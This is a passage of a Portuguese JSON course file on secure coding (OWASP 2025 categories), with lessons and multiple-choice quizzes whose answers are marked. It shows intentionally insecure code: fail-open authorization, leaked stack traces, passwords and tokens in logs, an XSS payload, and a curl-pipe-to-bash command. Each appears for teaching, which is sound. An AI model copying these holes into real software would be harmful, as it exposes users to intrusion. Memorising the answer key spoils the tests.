                        "value": "**Recapitulando:** confie em atualizações, plugins e scripts só depois de **verificar a assinatura** (a chave privada assina, a chave pública verifica) **antes** de executar; no browser, o **SRI** trava o conteúdo de um script de CDN pelo hash. E lembre que a **integridade do CI/CD** é parte do jogo: uma dependência ou etapa comprometida **antes** da assinatura envenena um artefato que sai legítimo. Fixe dependências por **hash**, aplique **menor privilégio** e proteja a esteira."
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que verificar a assinatura digital de uma atualização antes de instalá-la?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Para confirmar que ela veio mesmo do fornecedor e não foi alterada no caminho.",
                                "isCorrect": true
                            },
                            {
                                "text": "Para deixar o download da atualização perceptivelmente mais rápido para o usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Para economizar espaço em disco disponível no dispositivo do usuário final.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque a assinatura, sozinha, já criptografa todo o conteúdo do aplicativo.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O atributo integrity (Subresource Integrity, SRI) numa tag <script> protege contra:",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Um script de CDN adulterado: se o conteúdo não bater o hash, o navegador bloqueia.",
                                "isCorrect": true
                            },
                            {
                                "text": "Páginas que carregam de forma mais devagar por causa de uma conexão de rede lenta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Erros comuns de digitação cometidos dentro do próprio código JavaScript do site.",
                                "isCorrect": false
                            },
                            {
                                "text": "Cookies que já expiraram e continuam guardados dentro do navegador do usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O comando curl -s https://updates.exemplo.com/install.sh | bash tem qual problema principal?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Executa código baixado sem checar origem nem integridade, arriscando rodar malware.",
                                "isCorrect": true
                            },
                            {
                                "text": "Usa HTTPS na conexão, protocolo sempre inseguro para qualquer tipo de download.",
                                "isCorrect": false
                            },
                            {
                                "text": "O parâmetro -s do curl desativa, sozinho, toda a criptografia da conexão.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum: encadear o download direto no bash já é seguro por padrão, sem ressalvas.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "No CI/CD, referenciar uma action ou uma imagem de container como @latest (sem fixar versão ou hash) é arriscado porque:",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Uma versão futura, ou adulterada, roda sem revisão; fixar por hash reduz esse risco.",
                                "isCorrect": true
                            },
                            {
                                "text": "O @latest torna o processo de build significativamente mais lento do que o normal.",
                                "isCorrect": false
                            },
                            {
                                "text": "O @latest funciona corretamente apenas em alguns dias certos da semana, por convenção.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não há risco algum: @latest sempre aponta para a versão já auditada pelo time todo.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma empresa assina digitalmente seu instalador e a assinatura confere nos clientes; ainda assim, o instalador continha um backdoor. Onde a integridade falhou e qual defesa ataca a causa?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Falhou no build: uma dependência comprometida entrou antes de assinar; proteja o CI/CD.",
                                "isCorrect": true
                            },
                            {
                                "text": "A assinatura estava errada; bastaria simplesmente assinar o instalador de novo depois.",
                                "isCorrect": false
                            },
                            {
                                "text": "O problema foi o uso de HTTPS no download; trocar para HTTP resolveria o caso todo.",
                                "isCorrect": false
                            },
                            {
                                "text": "A culpa é do antivírus do usuário; não há nada a fazer do lado do fornecedor final.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Tratamento incorreto de condições excepcionais",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Tratamento incorreto de condições excepcionais\n\nChegamos ao **A10:2025 Tratamento incorreto de condições excepcionais**, categoria **nova** na edição de 2025. Todo programa encontra situações fora do caminho feliz: entrada inválida, rede que cai, banco fora do ar, um valor nulo inesperado, um tempo que se esgota. O que essa categoria diz é simples e poderoso: **a forma como você lida com o erro é uma questão de segurança.**\n\nOs problemas se dividem em duas famílias. A primeira é o **vazamento de informação**: mensagens de erro e stack traces detalhados que entregam ao atacante um mapa do sistema. A segunda é o **estado inseguro**: o erro leva o programa a tomar a decisão errada (liberar em vez de negar) ou a ficar com os dados pela metade. Vamos ver as duas com código."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: devolve o erro interno cru para o cliente.\napp.get(\"/pedido/:id\", async (req, res) => {\n  try {\n    const pedido = await db.buscarPedido(req.params.id);\n    res.json(pedido);\n  } catch (err) {\n    res.status(500).send(err.stack);  // vaza caminhos, versoes, a query...\n  }\n});\n// A resposta pode revelar: a stack de chamadas, nomes de tabelas, a query\n// que falhou, a versao do framework e ate segredos que estavam em variaveis."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: loga o detalhe no servidor e devolve uma mensagem generica + id.\napp.get(\"/pedido/:id\", async (req, res) => {\n  try {\n    const pedido = await db.buscarPedido(req.params.id);\n    if (!pedido) return res.status(404).json({ erro: \"nao encontrado\" });\n    res.json(pedido);\n  } catch (err) {\n    const id = crypto.randomUUID();\n    logger.error({ id, err });        // o detalhe completo fica so no log\n    res.status(500).json({ erro: \"erro interno\", id });  // cliente ve so o id\n  }\n});"
                    },
                    {
                        "type": "text",
                        "value": "## Fail-open x fail-secure e o perigo de engolir exceções\n\nQuando uma checagem de segurança falha, o sistema tem duas atitudes possíveis. **Fail-secure** (ou fail-closed): na dúvida, **negar**. **Fail-open**: na dúvida, **liberar**. Para controle de acesso, autenticação e autorização, a única escolha aceitável é **fail-secure**. Um fail-open numa checagem de permissão significa que qualquer instabilidade vira uma porta aberta.\n\nO erro mais comum que produz fail-open é **engolir a exceção**: um bloco catch vazio, ou um catch que não registra nada e **segue como se tudo tivesse dado certo**. Isso é perigoso por dois motivos. Primeiro, pode liberar acesso indevido (o catch que devolve \"autorizado\" no erro). Segundo, pode deixar os dados **inconsistentes**: numa operação de dois passos, o primeiro pode ter sido feito e o segundo não, sem ninguém perceber.\n\nDuas regras práticas: **nunca deixe um catch vazio** (registre o erro, no mínimo) e, para operações que precisam acontecer por inteiro, use **transações**, para que a falha em um passo **desfaça** o outro (tudo ou nada)."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO (fail-open): em caso de erro, LIBERA o acesso.\nasync function podeAcessar(user, recurso) {\n  try {\n    return await servicoDeAutorizacao.checar(user, recurso);\n  } catch (e) {\n    return true;  // \"para nao derrubar o site\" -> qualquer um entra!\n  }\n}\n\n// INSEGURO (engolir excecao): segue como se tudo tivesse dado certo.\ntry {\n  await debitarEstoque(item);\n  await cobrarCliente(pedido);\n} catch (e) {\n  // catch vazio: o cliente pode ser cobrado SEM baixar o estoque\n}\n\n// SEGURO (fail-secure): em caso de erro, NEGA; e trata a excecao de fato.\nasync function podeAcessar(user, recurso) {\n  try {\n    return await servicoDeAutorizacao.checar(user, recurso);\n  } catch (e) {\n    logger.error(\"falha na autorizacao\", e);\n    return false;  // na duvida, negar\n  }\n}\n// E, para a operacao de dois passos, use uma TRANSACAO: se um passo\n// falha, o outro e desfeito (tudo ou nada), sem estado inconsistente."
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** o **A10:2025** trata de erros e exceções mal tratados. Não devolva **stack traces** ao usuário: registre o detalhe no servidor (com um id de correlação) e responda algo **genérico**. Em checagens de segurança, prefira **fail-secure** (na dúvida, negar) em vez de **fail-open**. E **nunca engula exceções**: um catch vazio pode liberar acesso ou deixar os dados **inconsistentes**; use logs e **transações** para manter o sistema em estado seguro."
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que devolver o stack trace completo ao usuário em produção é perigoso?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Revela detalhes internos, como caminhos e queries, que ajudam a planejar o ataque.",
                                "isCorrect": true
                            },
                            {
                                "text": "Deixa a resposta de erro exibida na tela visualmente mais bonita para o usuário final.",
                                "isCorrect": false
                            },
                            {
                                "text": "Consome, de forma perceptível, bem menos banda do que uma mensagem de erro curta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Melhora o posicionamento da página de erro nos resultados de busca do Google.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Numa checagem de autorização, o que significa fail-secure (falhar fechado)?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Se a checagem falhar ou der erro, o acesso é negado por padrão, sem exceção.",
                                "isCorrect": true
                            },
                            {
                                "text": "Se a checagem falhar, o acesso é liberado, para não atrapalhar o usuário final.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ignorar o erro em completo silêncio e simplesmente continuar a execução normal.",
                                "isCorrect": false
                            },
                            {
                                "text": "Reiniciar o servidor inteiro a cada erro de autorização que for detectado.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Dentro de uma função podeAcessar(user, recurso), há um catch (e) { return true; }. Qual é o problema?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "É um comportamento fail-open: qualquer erro na autorização libera o acesso a todos.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: retornar true em caso de erro é sempre uma prática segura e recomendada aqui.",
                                "isCorrect": false
                            },
                            {
                                "text": "Afeta apenas o desempenho da função, nunca chegando a comprometer a segurança real.",
                                "isCorrect": false
                            },
                            {
                                "text": "Faltou só um console.log ali dentro; a lógica de acesso em si já está correta.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um bloco faz await debitarEstoque(item); await cobrarCliente(pedido); dentro de um try com catch (e) {} vazio. Qual o risco de engolir a exceção assim?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O sistema pode ficar inconsistente, cobrando o cliente sem baixar o estoque, sem notar.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: um catch vazio é justamente a forma recomendada de tratar esse tipo de erro.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas deixa a execução do código mais rápida, sem qualquer risco associado a isso.",
                                "isCorrect": false
                            },
                            {
                                "text": "Afeta somente o volume dos logs gerados, nunca a consistência dos dados salvos ali.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O serviço de autorização às vezes dá timeout. Para \"não derrubar o site\", o time faz o código liberar o acesso quando a checagem falha. Qual a melhor forma de equilibrar disponibilidade e segurança?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Falhar fechado e tratar a instabilidade com timeout curto e degradação controlada.",
                                "isCorrect": true
                            },
                            {
                                "text": "Manter o fail-open, já que a disponibilidade do site deve sempre vencer a segurança.",
                                "isCorrect": false
                            },
                            {
                                "text": "Colocar um catch vazio ali, para que o erro simplesmente desapareça sem ser tratado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Repetir a checagem dentro de um laço infinito, até que ela volte a funcionar direito.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "titulo": "Módulo 7 - Logging, defesa e o ciclo de desenvolvimento seguro",
        "aulas": [
            {
                "titulo": "A09: o que registrar e o que nunca registrar",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## A09:2025 — Falhas de logging e alerta de segurança\n\nChegamos ao módulo que costura a trilha inteira. As oito categorias anteriores descrevem *como uma aplicação é atacada*; esta descreve o que acontece **depois** que o ataque começa — e por que tantas invasões só são descobertas meses depois, muitas vezes por terceiros, e não pela própria empresa.\n\nA categoria **A09:2025 — Security Logging and Alerting Failures** (Falhas de logging e alerta de segurança) é diferente das outras. Ela não é uma porta que o atacante arromba diretamente: é a **falha que deixa todas as outras passarem despercebidas**. Uma tentativa de força bruta no login (A07), uma varredura de IDOR no controle de acesso (A01), uma injeção de SQL (A05) — todas deixam rastros. Mas o rastro só existe se você estiver registrando, e só vira defesa se alguém (ou algo) for avisado a tempo de agir.\n\nSem registro e sem alerta, o tempo que o invasor passa dentro do sistema sem ser notado (o *dwell time*) se estende de minutos para semanas ou meses — tempo de sobra para escalar privilégios, se mover lateralmente e exfiltrar dados."
                    },
                    {
                        "type": "text",
                        "value": "## O que registrar\n\nRegistre os **eventos relevantes para a segurança** — aqueles que contam a história de quem fez o quê. No mínimo:\n\n- **Autenticação:** tentativas de login bem-sucedidas **e** falhas, logout, troca e reset de senha.\n- **Controle de acesso:** acessos negados (respostas 403), tentativas de acessar recursos de outro usuário.\n- **Validação no servidor:** entradas rejeitadas por falharem na validação (sinal de sondagem).\n- **Eventos sensíveis:** criação e remoção de contas, mudança de papel ou privilégio, transações de alto valor.\n- **Erros do servidor:** exceções e respostas 500, que se conectam a A10 (condições excepcionais).\n\nCada registro deve responder a cinco perguntas: **quando** (timestamp com fuso horário), **quem** (usuário ou sessão), **o quê** (a ação), **de onde** (IP, user-agent) e **qual o resultado** (sucesso ou falha). E prefira **logging estruturado** (campos em JSON) em vez de texto solto: um log estruturado é pesquisável e permite criar alertas automáticos — um log em texto livre vira um amontoado que ninguém consulta."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: nao registra tentativas e ainda vaza segredos\nasync function login(req, res) {\n  const { email, senha } = req.body;\n  const user = await db.buscarUsuario(email);\n  if (!user || !(await bcrypt.compare(senha, user.hash))) {\n    // silencio total: nenhuma tentativa falha e registrada\n    return res.status(401).send(\"Credenciais invalidas\");\n  }\n  // pior ainda: joga a senha e o token no log\n  console.log(\"Login OK: \" + email + \" senha=\" + senha +\n              \" token=\" + gerarToken(user));\n  return res.json({ token: gerarToken(user) });\n}"
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: registra o evento (sem segredos) e nao vaza nada\nasync function login(req, res) {\n  const { email, senha } = req.body;\n  const user = await db.buscarUsuario(email);\n  const ok = user && (await bcrypt.compare(senha, user.hash));\n  logger.info({\n    evento: \"login\",\n    resultado: ok ? \"sucesso\" : \"falha\",\n    usuario: email,        // identificador, nunca a senha\n    ip: req.ip,\n    userAgent: req.get(\"user-agent\"),\n    ts: new Date().toISOString(),\n  });\n  if (!ok) return res.status(401).send(\"Credenciais invalidas\");\n  return res.json({ token: gerarToken(user) }); // token NAO vai ao log\n}"
                    },
                    {
                        "type": "text",
                        "value": "## O que NUNCA registrar\n\nRegistrar demais é tão perigoso quanto registrar de menos. **Jamais** escreva nos logs:\n\n- **Senhas** — nem em texto puro, nem o hash.\n- **Tokens de sessão, JWTs e cookies de autenticação** — quem tiver o log sequestra a sessão sem precisar hackear mais nada.\n- **Chaves de API, segredos e strings de conexão.**\n- **Dados de cartão completos e CVV** — o padrão PCI-DSS exige mascarar; guarde só os últimos quatro dígitos.\n- **Dados pessoais sensíveis** (CPF completo, dados de saúde) sem necessidade e sem mascaramento.\n\nA razão é simples: **logs se espalham**. Eles são copiados para agregadores (ELK, Datadog), backups, telas de suporte e planilhas de análise — lugares que costumam ter controle de acesso **mais fraco** que o banco de dados. Um token num log é uma porta lateral que anula justamente os dados que a criptografia de A04 tentava proteger.\n\nHá ainda um risco sutil: a **injeção de log** (*log forging*). Se você concatena entrada do usuário crua no log, um atacante pode injetar quebras de linha e forjar registros falsos, poluindo a investigação. É o mesmo princípio de A05 (Injeção): não confie na entrada. O logging estruturado resolve, porque trata cada valor como um campo isolado, sem interpretá-lo."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Registre sempre\",\"Nunca registre\"],[\"Tentativas de login (sucesso e falha)\",\"Senhas (em texto ou hash)\"],[\"Acessos negados / respostas 403\",\"Tokens de sessão, JWT e cookies\"],[\"Falhas de validação no servidor\",\"Chaves de API e segredos\"],[\"Reset de senha e mudança de privilégio\",\"Cartão completo e CVV\"],[\"Origem: IP, user-agent, usuário, timestamp\",\"PII sensível sem mascarar (CPF, saúde)\"]]"
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que a categoria A09 (Falhas de logging e alerta) é perigosa, mesmo não sendo uma falha que o atacante explora diretamente?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Sem registro nem alerta, os outros ataques passam despercebidos por mais tempo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Ela abre uma porta direta para comandos SQL nas tabelas do banco de dados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ela publica o código-fonte inteiro da aplicação para qualquer visitante.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ela desliga o HTTPS por completo e deixa o tráfego aberto à interceptação.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual destas informações NUNCA deve ser escrita nos logs da aplicação?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "O token de sessão do usuário que está autenticado no momento.",
                                "isCorrect": true
                            },
                            {
                                "text": "O endereço IP de onde a requisição HTTP foi originada.",
                                "isCorrect": false
                            },
                            {
                                "text": "O horário, com fuso horário, em que o evento ocorreu.",
                                "isCorrect": false
                            },
                            {
                                "text": "O resultado de uma tentativa de login, se foi sucesso ou falha.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um desenvolvedor registra cada login assim: logger.info(\"login\", { email, senha, token }). Qual é o problema?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Grava senha e token em texto puro; quem acessa os logs assume a conta sem invadir mais nada.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: registrar senha e token no log agiliza o suporte a resolver dúvidas dos usuários.",
                                "isCorrect": false
                            },
                            {
                                "text": "O problema é só desempenho, pois gravar objetos JSON no log deixa a resposta mais lenta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Faltou completar o log: deveria incluir também o hash da senha para fins de auditoria.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O endpoint de login responde 401 quando a senha está errada, mas não registra nada nesse caso. Que falha de A09 isso representa?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "As falhas de login não ficam registradas, e um ataque de força bruta roda sem deixar rastro.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhuma falha: como o login deu errado, não existe evento relevante para registrar ali.",
                                "isCorrect": false
                            },
                            {
                                "text": "É falha de criptografia, porque a resposta 401 estaria sendo enviada fora do HTTPS.",
                                "isCorrect": false
                            },
                            {
                                "text": "É falha de injeção, porque o código 401 abre caminho para SQL injection no formulário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um endpoint de busca registra assim: logger.info(\"busca: \" + req.query.q), concatenando a entrada crua do usuário. Um atacante envia um q com quebras de linha e texto forjado. Qual é o risco e a correção?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "É injeção de log: o atacante forja linhas falsas no arquivo; a correção é usar logging estruturado.",
                                "isCorrect": true
                            },
                            {
                                "text": "É SQL injection: o atacante lê o banco pelo próprio log; a correção é usar prepared statements no logger.",
                                "isCorrect": false
                            },
                            {
                                "text": "É XSS: o script forjado roda no navegador de quem abre o log; a correção é aplicar uma política de CSP.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não há risco real: quebras de linha em um log só deixam o arquivo um pouco maior, sem outra consequência.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Detecção, alerta e resposta a incidentes",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## De logs a resposta: detecção e alerta\n\nRegistrar é só metade de A09. Um log que ninguém lê é como uma câmera de segurança gravando para uma fita que nunca é assistida: custa espaço e não protege ninguém. A outra metade é **detectar** o que importa e **alertar** alguém a tempo de agir.\n\nDois números resumem a saúde dessa capacidade: o **MTTD** (tempo médio até *detectar*) e o **MTTR** (tempo médio até *responder e conter*). Quanto maiores, mais tempo o atacante tem para transformar uma porta aberta num desastre — do reconhecimento inicial à escalada de privilégio e à exfiltração de dados. O objetivo de todo o esforço de logging e alerta é **empurrar esses dois números para baixo**."
                    },
                    {
                        "type": "quote",
                        "value": "Um log que ninguém lê é só custo de disco. O valor da segurança está no alerta que dispara no momento certo e na pessoa (ou no automatismo) que age antes que o estrago se espalhe."
                    },
                    {
                        "type": "text",
                        "value": "## O que merece um alerta\n\nNem todo evento vira alerta — alertar sobre tudo é o caminho mais rápido para a **fadiga de alertas**, quando o time recebe tanto ruído que passa a ignorar até os avisos reais (a história do menino que gritava lobo). Alerte sobre **padrões suspeitos**, com limiares bem calibrados:\n\n- **Pico de falhas de login** de um IP, ou contra muitas contas → força bruta ou credential stuffing (A07).\n- **Muitos 403 de um mesmo usuário** → varredura de IDOR, testando IDs alheios (A01).\n- **Rajada de erros 500** com entradas estranhas → tentativa de injeção (A05) ou abuso de condições excepcionais (A10).\n- **Uso de conta de serviço fora do padrão** (horário, origem) ou mudança de privilégio inesperada.\n\nE **centralize**: envie os logs para fora do host, para um agregador ou SIEM. Se o atacante comprometer o servidor, os registros locais não valem nada — a primeira coisa que ele faz é apagá-los."
                    },
                    {
                        "type": "code",
                        "value": "// Regra de alerta (pseudocodigo): 10+ falhas de login do mesmo\n// IP em 5 minutos disparam um alerta E uma resposta automatica\nif (falhasLogin.contar({ ip, janela: \"5min\" }) >= 10) {\n  alerta.enviar({\n    severidade: \"alta\",\n    tipo: \"possivel_forca_bruta\",\n    ip,\n    usuariosAlvo: falhasLogin.usuarios(ip),\n  });\n  bloqueio.temporario(ip); // resposta, alem de apenas avisar\n}"
                    },
                    {
                        "type": "text",
                        "value": "## Logs íntegros e o plano de resposta\n\nComo dito, apagar rastros é uma das primeiras ações de um invasor. Por isso os logs de segurança devem ser **à prova de adulteração**: gravados em modo *append-only*, enviados imediatamente para fora do host e, idealmente, encadeados por hash para detectar qualquer alteração. E precisam de **retenção adequada** — guardar 24 horas de log é inútil quando invasões levam semanas para aparecer.\n\nQuando o alerta dispara, entra o **plano de resposta a incidentes**, em etapas: **detectar → conter → erradicar → recuperar → aprender**. Os logs são a matéria-prima da investigação forense: são eles que respondem *por onde o atacante entrou* e *o que ele acessou*. Sem logs íntegros e retidos, é impossível dimensionar o vazamento — e leis como a LGPD exigem que a empresa saiba e comunique exatamente **quais** dados foram expostos."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Sinal no log\",\"Possível ataque\",\"Vulnerabilidade relacionada\"],[\"Pico de falhas de login\",\"Força bruta / credential stuffing\",\"A07 — Autenticação\"],[\"Muitos 403 de um mesmo usuário\",\"Varredura de IDOR\",\"A01 — Controle de acesso\"],[\"Rajada de erros 500 com entradas estranhas\",\"Tentativa de injeção\",\"A05 — Injeção\"],[\"Chamadas a URLs ou dependências inesperadas\",\"Comprometimento de cadeia ou SSRF\",\"A03 / A06\"]]"
                    }
                ],
                "questions": [
                    {
                        "statement": "Qual a diferença entre \"logging\" e \"alerta\" em segurança?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Logging registra o que aconteceu; o alerta avisa alguém a tempo de agir.",
                                "isCorrect": true
                            },
                            {
                                "text": "São a mesma coisa: registrar um evento já conta como alertar sobre ele.",
                                "isCorrect": false
                            },
                            {
                                "text": "Logging só existe em produção, e o alerta só funciona em desenvolvimento.",
                                "isCorrect": false
                            },
                            {
                                "text": "O alerta grava os dados em disco, enquanto o logging os envia por e-mail.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que os logs de segurança devem ser enviados para fora do servidor (para um agregador ou SIEM)?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Assim, mesmo com o servidor comprometido, o atacante não consegue apagar os registros.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque logs guardados localmente ocupam espaço em disco e deixam o servidor mais lento.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque a legislação proíbe guardar qualquer log na mesma máquina que roda a aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque os agregadores criptografam automaticamente todas as senhas guardadas nos logs.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O sistema registrou 200 falhas de login de um mesmo IP em 2 minutos, mas ninguém foi avisado — a invasão só foi notada 3 semanas depois. Que aspecto de A09 falhou?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Faltou alerta e monitoramento ativo: o log existia, mas ninguém foi avisado a tempo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Faltou criptografia: as tentativas de login deveriam estar cifradas dentro do banco.",
                                "isCorrect": false
                            },
                            {
                                "text": "Faltou validação de entrada no formulário, o que permitiu as 200 tentativas seguidas.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nada falhou: três semanas é um prazo normal e aceitável para perceber uma invasão.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um time configurou um alerta para toda resposta 404 do site. Agora recebe 5.000 alertas por dia e passou a ignorar todos. Qual é o problema e a saída?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "É fadiga de alertas: o ruído faz o time ignorar avisos reais; a saída é calibrar limiares.",
                                "isCorrect": true
                            },
                            {
                                "text": "O problema é o código de status: bastaria trocar todo 404 por 500 no servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "O problema é o SIEM estar lento demais; a saída é comprar mais servidores para ele.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não há problema algum: quanto mais alertas o time recebe, mais segura fica a aplicação.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Após uma invasão, descobriu-se que os logs ficavam apenas no servidor comprometido (e foram apagados) e que a retenção era de 24 horas. Qual o impacto para a resposta ao incidente?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Sem logs íntegros, fica impossível apurar o escopo do vazamento e cumprir a notificação legal.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum impacto: a resposta a um incidente de segurança não depende dos logs do sistema.",
                                "isCorrect": false
                            },
                            {
                                "text": "O impacto é só estético: os relatórios ficam menos detalhados, mas a investigação segue igual.",
                                "isCorrect": false
                            },
                            {
                                "text": "O impacto é positivo: sem logs, o próprio atacante também não descobre nada sobre o sistema.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Defesas transversais I: validação, encoding e cabeçalhos",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Defesas transversais (I): não confie no cliente\n\nAté aqui, cada categoria trouxe suas defesas específicas. Neste módulo nós as **reunimos** — porque as defesas mais poderosas não pertencem a uma vulnerabilidade só; elas atravessam a trilha inteira. E a ideia que as une é a **defesa em profundidade**: nenhuma camada sozinha basta, então empilhamos várias, assumindo que qualquer uma pode falhar.\n\nA primeira e mais importante: **valide sempre no servidor**. A validação no navegador (o `required`, o `maxlength`, a máscara de CPF) existe só para a experiência do usuário. O atacante **não usa o seu navegador** — ele fala direto com a sua API por `curl`, Postman ou pelo DevTools, ignorando qualquer regra do front. Confiar na validação do cliente é a raiz de boa parte de A01 (controle de acesso feito só no front) e de A05 (injeção por entrada não filtrada)."
                    },
                    {
                        "type": "code",
                        "value": "// Frontend (apenas UX): o navegador limita o tamanho\n// <input name=\"bio\" required maxlength=\"20\">\n\n// Backend INSEGURO: confia que a entrada ja veio validada\napp.post(\"/perfil\", (req, res) => {\n  db.salvar({ bio: req.body.bio }); // aceita qualquer coisa\n  res.sendStatus(200);\n});\n\n// Backend SEGURO: valida no servidor por allowlist (o permitido)\napp.post(\"/perfil\", (req, res) => {\n  const bio = String(req.body.bio ?? \"\").slice(0, 20);\n  if (!/^[\\w\\s.,!?-]*$/u.test(bio)) {\n    return res.status(400).send(\"bio contem caracteres invalidos\");\n  }\n  db.salvar({ bio });\n  res.sendStatus(200);\n});"
                    },
                    {
                        "type": "text",
                        "value": "## Output encoding: a defesa central contra injeção\n\nValidar reduz entradas ruins, mas a defesa **definitiva** contra injeção é outra: tratar dado como **dado**, nunca como código, no momento em que ele é usado. Cada contexto tem sua técnica:\n\n- **SQL:** *prepared statements* / queries parametrizadas (nunca concatenar) — a defesa de A05 no banco.\n- **HTML:** *output encoding* — escapar a saída no contexto correto (corpo, atributo, JavaScript, URL).\n- **Sistema operacional:** evitar o shell; usar APIs que recebem os argumentos separados.\n\nRepare na divisão de trabalho: a **validação** acontece na *entrada*; o **encoding**, na *saída*. Frameworks modernos (React, engines de template) já escapam por padrão — o perigo mora quando você fura essa proteção com `innerHTML`, `dangerouslySetInnerHTML` ou concatenação manual de HTML."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: interpola a entrada do usuario direto no HTML.\n// Um nome como <img src=x onerror=alert(1)> executa script.\nel.innerHTML = \"Ola, \" + nomeUsuario;\n\n// SEGURO: trate o dado como TEXTO, nao como HTML.\nel.textContent = \"Ola, \" + nomeUsuario;\n\n// No servidor, confie no escape automatico do template engine\n// e evite montar HTML por concatenacao de strings."
                    },
                    {
                        "type": "text",
                        "value": "## Cabeçalhos de segurança e Content Security Policy\n\nCabeçalhos de resposta HTTP são instruções que o **navegador** obedece para se proteger. Ativá-los é barato e rende muito. Os principais:\n\n- **Content-Security-Policy (CSP):** define de quais origens scripts, estilos e recursos podem vir. É a **última linha de defesa contra XSS**: mesmo que um script malicioso seja injetado, o navegador se recusa a executá-lo se ele violar a política. A CSP é defesa em profundidade — **complementa**, não substitui, o output encoding.\n- **Strict-Transport-Security (HSTS):** obriga o navegador a usar sempre HTTPS (reforça A04).\n- **X-Content-Type-Options: nosniff:** impede o navegador de adivinhar tipos de arquivo.\n- **X-Frame-Options / frame-ancestors:** bloqueiam o enquadramento da página em um iframe (contra clickjacking).\n- **Cookies com HttpOnly, Secure e SameSite:** protegem o cookie de sessão contra roubo por script e contra CSRF (reforça A07 e A01)."
                    },
                    {
                        "type": "table",
